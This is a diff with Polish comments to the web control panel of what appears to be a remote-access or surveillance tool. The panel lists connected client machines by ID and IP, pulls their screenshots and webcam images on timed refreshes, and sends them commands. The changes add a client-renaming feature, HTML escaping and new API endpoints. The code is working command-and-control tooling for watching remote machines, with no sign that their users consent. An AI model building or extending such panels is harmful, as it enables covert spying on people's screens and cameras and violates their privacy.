@@ -567,6 +567,15 @@
             border-left: 3px solid #4CAF50;
         }
 
+         .edit-names-btn {
+            background: #9b59b6;
+            color: white;
+        }
+        
+        .edit-names-btn:hover {
+            background: #8e44ad;
+        }
+
         @media (max-width: 768px) {
             .main-content {
                 flex-direction: column;
@@ -689,7 +698,8 @@
                     <button class="command-btn" onclick="sendCommand('call musk')">Elon Musk</button>
                     <button class="command-btn" onclick="sendCommand('call trump')">Donald Trump</button>
                     <button class="command-btn" onclick="sendCommand('call epstine')">Jeffrey Epstein</button>
-                    <button class="command-btn" onclick="sendCommand('screenshot')">Zrób screenshot</button>   
+                    <button class="command-btn" onclick="sendCommand('screenshot')">Zrób screenshot</button>  
+                    <button class="command-btn edit-names-btn" onclick="openEditNamesModal()">Edytuj nazwe</button>
                 </div>
                 
                 <div style="margin-top: 20px;">
@@ -738,6 +748,56 @@
                     window.allClients = [];
                 });
         }
+
+        function openEditNamesModal() {
+            fetch('/api/get_names_file')
+                .then(response => response.text())
+                .then(content => {
+                    document.getElementById('namesTextarea').value = content;
+                    document.getElementById('editModal').style.display = 'flex';
+                    
+                    setTimeout(() => {
+                        document.getElementById('namesTextarea').focus();
+                    }, 100);
+                })
+                .catch(error => {
+                    console.error('Błąd ładowania pliku:', error);
+                    document.getElementById('namesTextarea').value = '# Plik z nazwami klientów\n# Format: ID_KLIENTA=Nazwa\n\n';
+                    document.getElementById('editModal').style.display = 'flex';
+                });
+        }
+
+        function saveNamesFile() {
+            const content = document.getElementById('namesTextarea').value;
+            
+            if (!content.trim()) {
+                alert('Plik nie może być pusty!');
+                return;
+            }
+            
+            fetch('/api/save_names_file', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ content: content })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    alert('✅ Nazwy zapisane pomyślnie!');
+                    closeEditModal();
+                    loadClientNames(); // Odśwież nazwy
+                } else {
+                    alert('❌ Błąd zapisu: ' + (data.error || 'Nieznany błąd'));
+                }
+            })
+            .catch(error => {
+                console.error('Błąd:', error);
+                alert('❌ Błąd połączenia z serwerem!');
+            });
+        }
+
 
         function closeEditModal() {
             document.getElementById('editModal').style.display = 'none';
@@ -928,49 +988,57 @@
             document.getElementById('fullscreenOverlay').style.display = 'none';
         }
 
+        function escapeHtml(text) {
+            if (!text) return '';
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+
+
         // Wybierz klienta - zaktualizowana funkcja
         function selectClient(clientId) {
             selectedClient = { id: clientId };
-            updateClients();
             
-            // Pobierz dane klienta z uwzględnieniem kamery
-            fetch('/api/get_clients_with_camera')
+            // Pobierz nazwę klienta
+            fetch(`/api/get_client_name/${clientId}`)
                 .then(response => response.json())
-                .then(clients => {
-                    const client = clients.find(c => c.id === clientId);
-                    if (client) {
-                        document.getElementById('selectedClientInfo').innerHTML = 
-                            `<strong>Wybrany klient:</strong> ${client.name || 'Unknown'} (${client.id.substring(0, 8)}...)`;
-                        
-                        // Pokaż/ukryj kontenery na podstawie dostępności
-                        const screenshotContainer = document.getElementById('screenshotContainer');
-                        const cameraContainer = document.getElementById('cameraContainer');
-                        
-                        screenshotContainer.style.display = 'block';
-                        cameraContainer.style.display = 'block';
-                        
-                        // Załaduj screenshot
-                        loadScreenshot(clientId);
-                        
-                        // Załaduj kamerę jeśli dostępna
-                        loadCamera(clientId);
-                        
-                        // Ustaw automatyczne odświeżanie
-                        if (screenshotRefreshInterval) {
-                            clearInterval(screenshotRefreshInterval);
-                        }
-                        screenshotRefreshInterval = setInterval(() => {
-                            loadScreenshot(clientId);
-                        }, 10000);
-                        
-                        if (cameraRefreshInterval) {
-                            clearInterval(cameraRefreshInterval);
-                        }
-                        cameraRefreshInterval = setInterval(() => {
-                            loadCamera(clientId);
-                        }, 15000); // Kamera rzadziej niż screenshot
-                    }
+                .then(nameData => {
+                    document.getElementById('selectedClientInfo').innerHTML = 
+                        `<strong>Wybrany klient:</strong> ${escapeHtml(nameData.displayName)} (${clientId.substring(0, 8)}...)`;
+                })
+                .catch(() => {
+                    document.getElementById('selectedClientInfo').innerHTML = 
+                        `<strong>Wybrany klient:</strong> ${clientId.substring(0, 8)}...`;
                 });
+            
+            // Pokaż kontenery
+            const screenshotContainer = document.getElementById('screenshotContainer');
+            const cameraContainer = document.getElementById('cameraContainer');
+            screenshotContainer.style.display = 'block';
+            cameraContainer.style.display = 'block';
+            
+            // Załaduj screenshot i kamerę
+            loadScreenshot(clientId);
+            loadCamera(clientId);
+            
+            // Ustaw automatyczne odświeżanie
+            if (screenshotRefreshInterval) {
+                clearInterval(screenshotRefreshInterval);
+            }
+            screenshotRefreshInterval = setInterval(() => {
+                loadScreenshot(clientId);
+            }, 10000);
+            
+            if (cameraRefreshInterval) {
+                clearInterval(cameraRefreshInterval);
+            }
+            cameraRefreshInterval = setInterval(() => {
+                loadCamera(clientId);
+            }, 15000);
+            
+            // Odśwież listę (pokazanie selekcji)
+            updateClients();
         }
 
         // Załaduj zdjęcie z kamery
@@ -1037,7 +1105,7 @@
 
         // Zaktualizuj updateClients() aby uwzględniał kamerę
         function updateClients() {
-            fetch('/api/get_clients_with_camera')
+            fetch('/api/get_clients_with_names')  // <-- ZMIEŃ TUTAJ!
                 .then(response => response.json())
                 .then(clients => {
                     const clientList = document.getElementById('clientList');
@@ -1051,26 +1119,30 @@
                     clients.forEach(client => {
                         const statusClass = client.status === 'active' ? 'status-active' : 'status-inactive';
                         const isSelected = selectedClient && selectedClient.id === client.id ? 'selected-client' : '';
-                        
-                        // Dodaj klasy na podstawie dostępności
                         const hasScreenshotClass = client.has_screenshot ? 'screenshot-available' : '';
                         const hasCameraClass = client.has_camera ? 'camera-available' : '';
                         
-                        // Ikony
                         const icons = [];
                         if (client.has_screenshot) icons.push('📸');
                         if (client.has_camera) icons.push('📷');
                         const iconsHtml = icons.join(' ');
                         
+                        // Użyj displayName z serwera
+                        const displayName = client.displayName || client.name || `Klient ${client.id.substring(0, 6)}`;
+                        const hasCustomName = client.hasCustomName || false;
+                        
                         html += `
-                            <div class="client-item ${isSelected} ${hasScreenshotClass} ${hasCameraClass}" 
-                                onclick="selectClient('${client.id}')"
-                                title="Screenshot: ${client.has_screenshot ? 'Tak' : 'Nie'}, Kamera: ${client.has_camera ? 'Tak' : 'Nie'}">
+                            <div class="client-item ${isSelected} ${hasScreenshotClass} ${hasCameraClass}" onclick="selectClient('${client.id}')">
                                 <div style="position: absolute; left: 10px; top: 10px; font-size: 0.8em;">
                                     ${iconsHtml}
                                 </div>
                                 <div class="client-info" style="margin-left: 30px;">
-                                    <div class="client-name">${client.name || 'Unknown'}</div>
+                                    <div class="client-name-display">
+                                        <strong style="cursor: pointer;">
+                                            ${escapeHtml(displayName)}
+                                        </strong>
+                                        ${hasCustomName ? '<span class="custom-name-badge">niestandardowa</span>' : ''}
+                                    </div>
                                     <div class="client-id">ID: ${client.id.substring(0, 8)}...</div>
                                     <div>IP: ${client.ip}</div>
                                 </div>
@@ -1083,8 +1155,17 @@
                     
                     clientList.innerHTML = html;
                 })
-                .catch(error => console.error('Błąd ładowania klientów:', error));
+                .catch(error => {
+                    console.error('Błąd ładowania klientów:', error);
+                    // Fallback na stary endpoint jeśli nowy nie działa
+                    fetch('/api/get_clients_with_camera')
+                        .then(response => response.json())
+                        .then(clients => {
+                            // ... kod fallback ...
+                        });
+                });
         }
+
 
         // Wyślij komendę - zaktualizuj dla kamery
         function sendCommand(command) {
